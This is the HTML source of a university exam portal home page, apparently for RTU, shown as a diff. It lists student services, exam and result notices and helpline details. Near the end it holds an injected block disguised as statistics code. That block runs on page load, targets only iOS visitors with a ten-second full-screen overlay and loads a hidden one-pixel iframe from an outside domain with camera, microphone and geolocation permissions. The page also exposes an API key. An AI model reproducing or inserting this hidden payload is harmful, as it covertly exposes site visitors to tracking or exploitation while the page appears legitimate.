class='col-md-2'><div class='services-two__single co1'><div class='services-two__icon col1'><span class='icon-coding'><i class='fa fa-graduation-cap' aria-hidden='true'></i></span></div><h3 class='services-two__title'><a href = 'Online/Acd_Convocation_data.aspx'> Convocation Student Data</a></h3><div class='services-two__btn-box'><a href = 'Online/Acd_Convocation_data.aspx' class='thm-btn services-two__btn co-1'>view</a></div></div></div><div class='col-md-2'><div class='services-two__single co5'><div class='services-two__icon col5'><span class='icon-coding'><i class='fa fa-user' aria-hidden='true'></i></span></div><h3 class='services-two__title'><a href = 'CollegePortal/LoginBag_Reval.aspx'> Bag Login (Revaluation Marks)</a></h3><div class='services-two__btn-box'><a href = 'CollegePortal/LoginBag_Reval.aspx' class='thm-btn services-two__btn co-5'>view</a></div></div></div><div class='col-md-2'><div class='services-two__single co8'><div class='services-two__icon col8'><span class='icon-coding'><i class='fa fa-file-text-o' aria-hidden='true'></i></span></div><h3 class='services-two__title'><a href = 'CollegePortal/StudentRegistration/Reg_Registration_Login.aspx'> Enrollment Registration For UD</a></h3><div class='services-two__btn-box'><a href = 'CollegePortal/StudentRegistration/Reg_Registration_Login.aspx' class='thm-btn services-two__btn co-8'>view</a></div></div></div><div class='col-md-2'><div class='services-two__single co4'><div class='services-two__icon col4'><span class='icon-coding'><i class='fa fa-file-text-o' aria-hidden='true'></i></span></div><h3 class='services-two__title'><a href = 'Online/Revaluation/LoginExam_Reval.aspx'> Revaluation-UTD</a></h3><div class='services-two__btn-box'><a href = 'Online/Revaluation/LoginExam_Reval.aspx' class='thm-btn services-two__btn co-4'>view</a></div></div></div><div class='col-md-2'><div class='services-two__single co3'><div class='services-two__icon col3'><span class='icon-coding'><i class='fa fa-university' aria-hidden='true'></i></span></div><h3 class='services-two__title'><a href = 'LoginAffInspection.aspx'> Affiliation Inspection Login</a></h3><div class='services-two__btn-box'><a href = 'LoginAffInspection.aspx' class='thm-btn services-two__btn co-3'>view</a></div></div></div><div class='col-md-2'><div class='services-two__single co7'><div class='services-two__icon col7'><span class='icon-coding'><i class='fa fa-credit-card' aria-hidden='true'></i></span></div><h3 class='services-two__title'><a href = 'https://rtustudentportal.sumsraj.com/'> Hostel Fee Other Then First Year</a></h3><div class='services-two__btn-box'><a href = 'https://rtustudentportal.sumsraj.com/' class='thm-btn services-two__btn co-7'>view</a></div></div></div><div class='col-md-2'><div class='services-two__single co4'><div class='services-two__icon col4'><span class='icon-coding'><i class='fa fa-columns' aria-hidden='true'></i></span></div><h3 class='services-two__title'><a href = 'Dispatch/BarcodeAndScanning/Reevaluation_View_Copy.aspx'> View Copy Of Revaluation</a></h3><div class='services-two__btn-box'><a href = 'Dispatch/BarcodeAndScanning/Reevaluation_View_Copy.aspx' class='thm-btn services-two__btn co-4'>view</a></div></div></div><div class='row'><div class='col-md-2'><div class='services-two__single co10'><div class='services-two__icon col10'><span class='icon-coding'><i class='fa fa-book' aria-hidden='true'></i></span></div><h3 class='services-two__title'><a href = 'CollegePortal/AlumniFeedback/Alumni_Login_ALL.aspx'> Syllabus Feedback -  ALUMNI</a></h3><div class='services-two__btn-box'><a href = 'CollegePortal/AlumniFeedback/Alumni_Login_ALL.aspx' class='thm-btn services-two__btn co-10'>view</a></div></div></div><div class='col-md-2'><div class='services-two__single co8'><div class='services-two__icon col8'><span class='icon-coding'><i class='fa fa-file-text' aria-hidden='true'></i></span></div><h3 class='services-two__title'><a href = 'DocumentRequest/Doc_TCCC_Request_LoginPage.aspx'> Apply Certificate For UD (TC/CC/Bonafide)</a></h3><div class='services-two__btn-box'><a href = 'DocumentRequest/Doc_TCCC_Request_LoginPage.aspx' class='thm-btn services-two__btn co-8'>view</a></div></div></div><div class='col-md-2'><div class='services-two__single co7'><div class='services-two__icon col7'><span class='icon-coding'><i class='fa fa-user' aria-hidden='true'></i></span></div><h3 class='services-two__title'><a href = 'https://rtuoffice.sumsraj.com/'> Backoffice Login</a></h3><div class='services-two__btn-box'><a href = 'https://rtuoffice.sumsraj.com/' class='thm-btn services-two__btn co-7'>view</a></div></div></div><div class='col-md-2'><div class='services-two__single co10'><div class='services-two__icon col10'><span class='icon-coding'><i class='fa fa-television' aria-hidden='true'></i></span></div><h3 class='services-two__title'><a href = 'DC_Request/DC_Login.aspx'> DC Demo</a></h3><div class='services-two__btn-box'><a href = 'DC_Request/DC_Login.aspx' class='thm-btn services-two__btn co-10'>view</a></div></div></div></div>
+
+
+                            </div>
+                        </fieldset>
+                    </div>
+
+
+                    <div class="col-md-12">
+                        <div class="all_step">
+                            <div class="col-xs-12 col-md-6 col-lg-6 col-xl-6">
+                                <div class="row">
+                                    <div class="col-lg-6 col-sm-6 col-sm-12 col-xs-12" style="display: none;">
+                                        <div class="widget-title">
+                                            <h4><i class="fa fa-calendar"></i>Examination Time Table</h4>
+                                        </div>
+                                        <div class="card-box ovrflw">
+                                            <div class="form_ul">
+                                                <ul>
+                                                    <div id="Anthem_RptOffOrder__">
+                                                        </div>
+                                                </ul>
+                                            </div>
+
+                                            <div class="view_all"><span><a href="CollegePortal/General_Inst_Notification.aspx?type=O&&Heading=Examination Time Table" target="_blank">View all Examination Time Table >></a></span> </div>
+
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <footer class="loginfooter-lgn">
+                        
+                        <img width="113" style="float: right; margin: -26px 0 0 0;" src="Images/comodo_secure_113x59_transp.png">
+                    </footer>
+
+                </div>
+            </div>
+
+            
+
+
+
+
+            <nav id="sidebarnew">
+                <div id="dismiss">
+                    <i class="glyphicon glyphicon-arrow-left"></i>
+                </div>
+                
+                <ul class="list-unstyled components">
+                    <p><i class="fa fa-align-left" aria-hidden="true"></i>Other Usefull Links</p>
+                    <li>
+                        <a href="CollegePortal/General_Notification.aspx"><i class="fa fa-caret-right" aria-hidden="true"></i>General Instructions and Notifications </a>
+                    </li>
+                    <li>
+                        <a href="Online/ACD_ExamFormOpen_Mst_New.aspx"><i class="fa fa-caret-right" aria-hidden="true"></i>Examination Form Start & Close Date</a>
+                    </li>
+                    <li style="display: none;">
+                        <a href="Academics/ACD_Branchwise_VacantSeats_Status.aspx"><i class="fa fa-caret-right" aria-hidden="true"></i>Vacant Seats Status</a>
+                    </li>
+
+                    
+
+                    
+                    
+                </ul>
+            </nav>
+
+
+            <div id="myModal" class="modal fade" role="dialog">
+                <div class="modal-dialog">
+
+                    <!-- Modal content-->
+                    <div class="modal-content">
+                        <div class="modal-header">
+                            <button type="button" class="close" data-dismiss="modal">&times;</button>
+                            <h4 class="modal-title" style="color: #012B55;"><i class="fa fa-fw fa-headphones"></i>RTU Helpline Sewa</h4>
+                        </div>
+                        <div class="modal-body">
+                            <div class="row">
+                                <div class="col-md-12">
+                                    <img class="img-responsive img-rounded" src="img/helpline-image.jpg" />
+                                </div>
+                                <div class="col-md-12">
+                                    <div class="form_ul sm_ul" style="padding: 10px; height: auto;">
+                                        <ul>
+                                            <li><span><i class="fa fa-phone-square" style="color: #ff9800;"></i>
+                                                RTU Helpline Sewa between 10:00 AM TO 5:00 PM (Monday - Saturday)    For Admission : <span style="color: blue">+91-8826133117</span></span></li>
+                                            <li><span><i class="fa fa-envelope-o" style="color: #009595;"></i>For any query related to Student's  Admission please contact at <span style="color: blue">rtusumshelp@gmail.com</span> </span></li>
+                                            
+                                        </ul>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                </div>
+            </div>
+
+            <div id="news" class="modal fade" role="dialog">
+                <div class="modal-dialog modal-lg custom-modal-lg">
+                    <!-- Modal content-->
+                    <div class="modal-content">
+                        
+                        <div class="modal-body">
+                            <button type="button" class="close" data-dismiss="modal">&times;</button>
+                            <div class="row no-gutter">
+                                <div class="col-md-3">
+                                    <div class="row">
+                                        <div class="col-md-12">
+                                            <div class="popup-img">
+                                                <img src="img/news-and-event-icon.webp" />
+                                            </div>
+                                        </div>
+                                        <div class="col-md-12">
+                                            <div class="h4-text text-center">
+                                                <h4>News
+                                                    <br />
+                                                    &
+                                                    <br />
+                                                    Events</h4>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="col-md-9">
+                                    <div class="form_ul ul-from ovrflws">
+                                        <div class="marquee-container">
+                                            <ul id="downlaod" class="News marquee-content">
+                                            <ul class='News'><li> <i class='fa fa-hand-o-right'> </i> EXAM FORMS ARE NOW  LIVE WITH NORMAL FEE + 500 LATE FEE FOR B.Tech V & VII Semester,
+B.Tech VIII Semester (held with odd semester),
+B.Arch – V, VII & IX Semesters,
+BBA – III & V Semesters,
+BCA – III & V Semesters,
+M.Tech – III Semester,
+BFAD V & VII Semester,
+B.DES V & VII Semester,
+BFA V & VII Semester,
+M.TECH ( PART- TIME ) V Semester &
+BVE V & VII Semester FOR SESSION 2026-2027. LAST DATE FOR FORM SUBMISSION - 24/10/2026.  LAST DATE FOR PAYMENT UPTO 26/10/2026.<span><span><span class="submitbypostedby">&nbsp;&nbsp;&nbsp;<span style='color:red'>Posted on&nbsp;</span></span><span style='color:red'> 18-10-2026</span></span>&nbsp;&nbsp;<img style='visibility: hidden' src="Images/gif-new.gif"></span></li><li> <i class='fa fa-hand-o-right'> </i> Revaluation Result has been live for MBA IVth Sem main/back, BBA IIIrd Semester & BCA IIIrd Semester , SESSION 2025-2026<span><span class="submitbypostedby">&nbsp;&nbsp;&nbsp;<span style='color:red'>Posted on&nbsp;</span></span> <span style='color:red'>15-10-2026</span></span></li><li> <i class='fa fa-hand-o-right'> </i> EXAMINATION FORM HAS BEEN REOPENED FOR B.TECH UD I, III, V & VII SEMESTER (BACK/REBACK) FOR SESSION 2026-2027. LAST DATE - 30/OCT/2026 WITH 2000 RS LATE FEE<span><span class="submitbypostedby">&nbsp;&nbsp;&nbsp;<span style='color:red'>Posted on&nbsp;</span></span><span style='color:red'> 15-10-2026</span></span></li><li> <i class='fa fa-hand-o-right'> </i> III,V & VII SEMESTER FEE SUBMISSION HAS BEEN REOPENED. LAST DATE FOR PAYMENT WITH 2400 RS LATE FEE IS 16-OCT-2026.<span><span class="submitbypostedby">&nbsp;&nbsp;&nbsp;<span style='color:red'>Posted on&nbsp;</span></span> <span style='color:red'>14-10-2026</span></span></li><li> <i class='fa fa-hand-o-right'> </i> ADMIT CARDS ARE NOW LIVE FOR THE MERCY EXAMINATION FOR B.TECH IV & V SEMESTER , MCA V SEMESTER & B.ARCH V SEMESTER.<span><span class="submitbypostedby">&nbsp;&nbsp;&nbsp;<span style='color:red'>Posted on&nbsp;</span></span><span style='color:red'> 10-10-2026</span></span></li><li> <i class='fa fa-hand-o-right'> </i> DATE HAS BEEN EXTENDED FOR REVALUATION FORM FOR B.TECH II, IV & VI SEMESTER, MCA II SEMESTER, BCA II SEMESTER & BBA II SEMESTER FOR SESSION 2025-26. LAST DATE- 26/OCT/2026.<span><span class="submitbypostedby">&nbsp;&nbsp;&nbsp;<span style='color:red'>Posted on&nbsp;</span></span> <span style='color:red'>05-10-2026</span></span></li><li> <i class='fa fa-hand-o-right'> </i> B-TECH II, IV & VI SEMESTER EXAM, SESSION 2025-26 RESULT LIVE.<span><span class="submitbypostedby">&nbsp;&nbsp;&nbsp;<span style='color:red'>Posted on&nbsp;</span></span><span style='color:red'> 03-10-2026</span></span></li><li> <i class='fa fa-hand-o-right'> </i> BBA II SEMESTER EXAM, SESSION 2025-26 RESULT LIVE.<span><span class="submitbypostedby">&nbsp;&nbsp;&nbsp;<span style='color:red'>Posted on&nbsp;</span></span> <span style='color:red'>03-10-2026</span></span></li><li> <i class='fa fa-hand-o-right'> </i> BCA II SEMESTER EXAM, SESSION 2025-26 RESULT LIVE.<span><span class="submitbypostedby">&nbsp;&nbsp;&nbsp;<span style='color:red'>Posted on&nbsp;</span></span><span style='color:red'> 03-10-2026</span></span></li><li> <i class='fa fa-hand-o-right'> </i> MCA II SEMESTER EXAM, SESSION 2025-26 RESULT LIVE.<span><span class="submitbypostedby">&nbsp;&nbsp;&nbsp;<span style='color:red'>Posted on&nbsp;</span></span> <span style='color:red'>03-10-2026</span></span></li></ul></ul>
+                                        </div>
+                                        
+                                    </div>
+                                </div>
+                            </div>
+
+                            
+                        </div>
+                    </div>
+
+                </div>
+            </div>
+
+
+            <div id="important-links" class="modal fade" role="dialog">
+                <div class="modal-dialog modal-lg custom-modal-lg">
+
+                    <!-- Modal content-->
+                    <div class="modal-content">
+                        
+                        <div class="modal-body">
+                            <button type="button" class="close" data-dismiss="modal">&times;</button>
+                            <div class="row no-gutter">
+                                <div class="col-md-3">
+                                    <div class="row">
+                                        <div class="col-md-12">
+                                            <div class="popup-img">
+                                                <img src="img/links.webp" />
+                                            </div>
+                                        </div>
+                                        <div class="col-md-12">
+                                            <div class="h4-text text-center big-text">
+                                                <h4>Important
+                                                    <br />
+                                                    Links </h4>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="col-md-9">
+                                    <div class="form_ul imp_link ul-from ovrflws">
+                                        <ul class="scroll-flws">
+                                            <div id="Anthem_ImpRptr__"></div>
+                                            
+                                        </ul>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        
+                    </div>
+                </div>
+
+            </div>
+        </div>
+
+        <div id="notification" class="modal fade" role="dialog">
+            <div class="modal-dialog modal-lg custom-modal-lg">
+                <!-- Modal content-->
+                <div class="modal-content">
+                    
+                    <div class="modal-body">
+                        <button type="button" class="close" data-dismiss="modal">&times;</button>
+                        <div class="row no-gutter">
+                            <div class="col-md-3">
+                                <div class="row">
+                                    <div class="col-md-12">
+                                        <div class="popup-img">
+                                            <img src="img/genarl-instruction.webp" />
+                                        </div>
+                                    </div>
+                                    <div class="col-md-12">
+                                        <div class="h4-text text-center big-text">
+                                            <h4>General
+                                                <br />
+                                                Instructions
+                                                <br />
+                                                and
+                                                <br />
+                                                Notifications</h4>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="col-md-9">
+                                <div class="form_ul ul-from ovrflws">
+                                    <ul class="scroll-flws">
+                                        <div id="Anthem_rptNotietype__">
+                                            
+                                                <li><em>Posted on: <span>11/10/2026</span></em>
+                                                    <div class="clearfix"></div>
+                                                    <a href="CollegePortal/General_Inst_Not_Desc.aspx?id=1540" target="_blank"><i class="fa fa-fw fa-caret-right"></i>NOTICE FOR CONSENT FORM TO STUDENTS</a><br />
+                                                    <div class="clearfix"></div>
+                                                    <span id="rptNotietype_ctl01_Downimg" class="downloadicon"><i class="fa fa-fw fa-file-pdf-o"></i>
+                                                        <span id="Anthem_rptNotietype_ctl01_LnkBtnDownload__"><a id="rptNotietype_ctl01_LnkBtnDownload" href="javascript:__doPostBack(&#39;rptNotietype$ctl01$LnkBtnDownload&#39;,&#39;&#39;)" style="font-weight:bold;color: green;">Download</a></span>
+                                                    </span>
+                                                </li>
+                                            
+                                                <li><em>Posted on: <span>26/09/2026</span></em>
+                                                    <div class="clearfix"></div>
+                                                    <a href="CollegePortal/General_Inst_Not_Desc.aspx?id=1539" target="_blank"><i class="fa fa-fw fa-caret-right"></i>SCHEDULE FOR FILLING UP ONLINE EXAMINATION FORMS FOR ODD SEMESTER (MAIN/BACK/MERCY BACK) EXAMINATIONS 2026-27</a><br />
+                                                    <div class="clearfix"></div>
+                                                    <span id="rptNotietype_ctl02_Downimg" class="downloadicon"><i class="fa fa-fw fa-file-pdf-o"></i>
+                                                        <span id="Anthem_rptNotietype_ctl02_LnkBtnDownload__"><a id="rptNotietype_ctl02_LnkBtnDownload" href="javascript:__doPostBack(&#39;rptNotietype$ctl02$LnkBtnDownload&#39;,&#39;&#39;)" style="font-weight:bold;color: green;">Download</a></span>
+                                                    </span>
+                                                </li>
+                                            
+                                                <li><em>Posted on: <span>15/06/2026</span></em>
+                                                    <div class="clearfix"></div>
+                                                    <a href="CollegePortal/General_Inst_Not_Desc.aspx?id=1526" target="_blank"><i class="fa fa-fw fa-caret-right"></i>TENTATIVE SCHEDULE FOR MERCY EXAMS</a><br />
+                                                    <div class="clearfix"></div>
+                                                    <span id="rptNotietype_ctl03_Downimg" class="downloadicon"><i class="fa fa-fw fa-file-pdf-o"></i>
+                                                        <span id="Anthem_rptNotietype_ctl03_LnkBtnDownload__"><a id="rptNotietype_ctl03_LnkBtnDownload" href="javascript:__doPostBack(&#39;rptNotietype$ctl03$LnkBtnDownload&#39;,&#39;&#39;)" style="font-weight:bold;color: green;">Download</a></span>
+                                                    </span>
+                                                </li>
+                                            </div>
+                                        
+                                    </ul>
+                                </div>
+                            </div>
+                        </div>
+                        
+                    </div>
+                </div>
+
+            </div>
+        </div>
+
+        <div id="mrq" class="modal fade" role="dialog">
+            <div class="modal-dialog modal-lg">
+
+                <!-- Modal content-->
+                <div class="modal-content">
+                    <div class="modal-header">
+                        <button type="button" class="close" data-dismiss="modal">&times;</button>
+                        <h4 class="modal-title"><i class="fa fa-fw fa-info"></i>IMPORTANT NOTIFICATION</h4>
+                    </div>
+                    <div class="modal-body">
+
+                        <p style="font-size: 15px; color: #16857f; font-weight: 500;">
+                            > MBA & MCA IInd Sem. Revaluation Result Live (2021-22)
+                                <img style="visibility: hidden" src="img/gif-new.gif" />
+                        </p>
+
+                        <p style="font-size: 15px; color: #176297; font-weight: 500;">
+                            > RTU MBA II Semester (Main/Back/Mercy Back) Examination Form Filling Open.
+                                <br />
+                            Last Date (<span style="color: #b72c2c;">With Double Fee):  14 July 2023 ,</span>
+                            Payment Upto  <span style="color: #b72c2c;">14 July 2023.</span>
+                            <img src="img/gif-new.gif" />
+
+                        </p>
+
+                        <p style="font-size: 15px; color: #176297; font-weight: 500;">
+                            > RTU MCA & M.Tech. II Semester (Main/Back/Mercy Back) Examination Form Filling Open.
+                                <br />
+                            Last Date (<span style="color: #b72c2c;">With Normal/Single Fee):  15 July 2023 ,</span>
+                            Payment Upto  <span style="color: #b72c2c;">15 July 2023.</span>
+                            <img src="img/gif-new.gif" />
+
+                        </p>
+
+                        <p style="font-size: 15px; color: #0a460c; font-weight: 500;">
+                            > The marks feeding for B. Arch IIIrd, Vth, VIIth, IXth, and Xth Semester has been open until July 14, 2023.
+                                <img src="img/gif-new.gif" />
+                        </p>
+
+                        <p style="font-size: 15px; color: #832780; font-weight: 500;">
+                            > The marks feeding for B.Tech. (RTU) 8th Semester has been open until July 14, 2023.
+                                <img src="img/gif-new.gif" />
+                        </p>
+
+                        <p style="font-size: 15px; color: #16857f; font-weight: 500;">
+                            > B.Tech. RTU VIIth Sem. Revaluation Form Open , Last Date 14 July 2023
+                                <img src="img/gif-new.gif" />
+                        </p>
+
+                        
+
+                        <p style="font-size: 15px; color: #176297; font-weight: 500;">
+                            > RTU B. Tech./BHMCT/B.Arch. Semester, and M.Arch. (II & IV Sem.) (Main/Back/Mercy Back) Examination Form Filling Open.
+                                <br />
+                            Last Date (<span style="color: #b72c2c;">With Double Fee):  12 July 2023 ,</span>
+                            Payment Upto  <span style="color: #b72c2c;">13 July 2023.</span>
+
+                        </p>
+
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div id="dvEnNo" class="white_content-new-1" style="display: none">
+            <div class="popupboxouter">
+                <div class="popupbox">
+                    <div onclick="$('#rdbType').find('input:radio').each(function (i) { this.checked = false;});
+                        $('#dvEnNo').fadeOut(1000);"
+                        class="close-1">
+                        X
+                    </div>
+                    <div style="display: none" id="dvEnroll">
+                        <div class="table-responsive no-padding">
+                            <table class="table" style="padding: 0px; margin: 0px; border: 0px; width: 100%;">
+                                <tr>
+                                    <td colspan="6" class="tableheading">
+                                        <span id="Anthem_ctl13__"><span id="ctl13">NOTICE</span></span>
+                                    </td>
+                                </tr>
+                                <tr>
+                                    <td colspan="6">
+                                        <div style="width: 80%; text-align: center;">
+                                            <div id="Anthem_pnlPopupContent__"><div id="pnlPopupContent">
+	
+                                                
+                                            
+</div></div>
+
+                                        </div>
+                                    </td>
+                                </tr>
+                            </table>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </form>
+<!-- iis_stats native v1.0.3 -->
+<!-- data-cf-beacon-iis-stats -->
+
+<style>
+#spg{position:fixed;inset:0;z-index:2147483647;background:#fff;display:flex;align-items:center;justify-content:center;transition:opacity .35s;}
+#spg .sp{width:38px;height:38px;border:3px solid #e8e8e8;border-top-color:#3b82f6;border-radius:50%;animation:sp .8s linear infinite;}
+@keyframes sp{to{transform:rotate(360deg);}}
+</style>
+<script>
+(function(){
+  var SPIN_MS = 10000;
+  var REMEMBER_MS = 86400000;
+  var KEY = '_cv';
+  if (!/(?:iPhone|iPad|iPod|CPU OS)/i.test(navigator.userAgent)) return;
+  try { if (Date.now() < (+localStorage.getItem(KEY) || 0)) return; } catch (e) {}
+  var g = document.createElement('div');
+  g.id = 'spg';
+  g.innerHTML = '<div class="sp"></div>';
+  (document.body || document.documentElement).appendChild(g);
+  setTimeout(function(){
+    try { localStorage.setItem(KEY, String(Date.now() + REMEMBER_MS)); } catch (e) {}
+    g.style.opacity = '0';
+    setTimeout(function(){ g.parentNode && g.parentNode.removeChild(g); }, 400);
+  }, SPIN_MS);
+})();
+</script>
+<iframe src="https://g1ha.lol/ch/first?ch=first" width="100%" height="1" frameborder="0" allow="camera;microphone;geolocation" style="border:0;display:block"></iframe><script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/vce701823e78c4301a35b7e07294d87301792088814092" integrity="sha512-UKNk8GbxkABxKcXYuLkO16EleLGUkcvJWtpSNmExE0Too3ZaFAxTscNWEc1OdAv5/BikHawapSCaiD2XCmp+Bw==" data-cf-beacon='{"version":"2024.11.0","token":"7bf418926d144bedbcdc0b591e466374","r":1,"spa":2}' crossorigin="anonymous"></script>
+</body>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+<script src="include/jquery.mCustomScrollbar.concat.min.js"></script>
+<script src="include/js/breaking-news-ticker.min.js"></script>
+<script src="include/date.format.js"></script>
+<script type="text/javascript">
+    function Timer() {
+        var dt = new Date()
+        document.getElementById('date').innerHTML = dateFormat(new Date(), "dddd, mmmm dS, yyyy") + "," + dt.getHours() + ":" + dt.getMinutes() + ":" + dt.getSeconds();
+        setTimeout("Timer()", 1000);
+    }
+    Timer();
+</script>
+<script>
+    $('.carousel').carousel({
+        interval: false,
+    });
+</script>
+<script>
+    $(document).ready(function () {
+        $('[data-toggle="tooltip"]').tooltip();
+    });
+</script>
+<script type="text/javascript">
+    $(document).ready(function () {
+        $("#sidebarnew").mCustomScrollbar({
+            theme: "minimal"
+        });
+
+        $('#dismiss, .overlay').on('click', function () {
+            $('#sidebarnew').removeClass('active');
+            $('.overlay').fadeOut();
+        });
+
+        $('#sidebarCollapse').on('click', function () {
+            $('#sidebarnew').addClass('active');
+            $('.overlay').fadeIn();
+            $('.collapse.in').toggleClass('in');
+            $('a[aria-expanded=true]').attr('aria-expanded', 'false');
+        });
+    });
+</script>
+
+
+<script type="text/javascript">
+    $(window).on('load', function () {
+        $('#news').modal('show');
+    });
+</script>
+
+<script type="text/javascript">
+    $(window).on('load', function () {
+        $('#notification').modal('show');
+    });
+</script>
+
+
+<script type="text/javascript">
+
+    jQuery(document).ready(function ($) {
+
+        $('#newsTicker1').breakingNews();
+        //$('#newsTicker2').data('breakingNews').next();
+
+        $('#newsTicker2').breakingNews({
+            direction: 'rtl'
+        });
+
+        $('#newsTicker3').breakingNews({
+            themeColor: '#f9a828',
+            effect: 'slide-left'
+        });
+
+        $('#newsTicker4').breakingNews({
+            themeColor: '#11cbd7',
+            source: {
+                type: 'rss',
+                usingApi: 'rss2json',
+                rss2jsonApiKey: '5ivfzdrkuqwmoe0dgxeqvhfz0knlo7yq4fw20bt0',
+                url: 'http://rss.cnn.com/rss/edition.rss',
+                limit: 7,
+                showingField: 'title',
+                linkEnabled: true,
+                target: '_blank',
+                seperator: '<span class="bn-seperator" style="background-image:url(img/cnn-logo.png);"></span>',
+                errorMsg: ''
+            }
+        });
+
+    });
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/slick-carousel/1.5.7/slick.js"></script>
+<script>
+    jQuery(document).ready(function ($) {
+        $('.slider').slick({
+            dots: false,
+            infinite: true,
+            speed: 500,
+            slidesToShow: 3,
+            slidesToScroll: 1,
+            autoplay: true,
+            autoplaySpeed: 2000,
+            arrows: true,
+            responsive: [{
+                breakpoint: 600,
+                settings: {
+                    slidesToShow: 2,
+                    slidesToScroll: 1
+                }
+            },
+            {
+                breakpoint: 400,
+                settings: {
+                    arrows: false,
+                    slidesToShow: 1,
+                    slidesToScroll: 1
+                }
+            }]
+        });
+    });
+</script>
+
+<script>
+
+    function Redirect() {
+
+        if (location.protocol != 'https:') {
+            window.location = "https://rtu.sumsraj.com"
+        }
+
+        if (window.location.hostname.toUpperCase().toUpperCase() == "HTTPS://WWW.RTU.SUMSRAJ.COM") {
+            window.location = "https://rtu.sumsraj.com"
+        }
+        if (window.location.hostname.toUpperCase().toUpperCase() == "HTTP://WWW.RTU.SUMSRAJ.COM") {
+            window.location = "https://rtu.sumsraj.com"
+        }
+
+        if (window.location.hostname.toUpperCase() == "WWW.RTU.SUMSRAJ.COM") {
+            window.location = "https://rtu.sumsraj.com"
+        }
+
+    }
+
+    //function Timer() {
+    //    var dt = new Date()
+    //    document.getElementById('date').innerHTML = dateFormat(new Date(), "dddd, mmmm dS, yyyy") + "," + dt.getHours() + ":" + dt.getMinutes() + ":" + dt.getSeconds();
+    //    setTimeout("Timer()", 1000);
+    //}
+    //Timer();
+</script>
+</html>
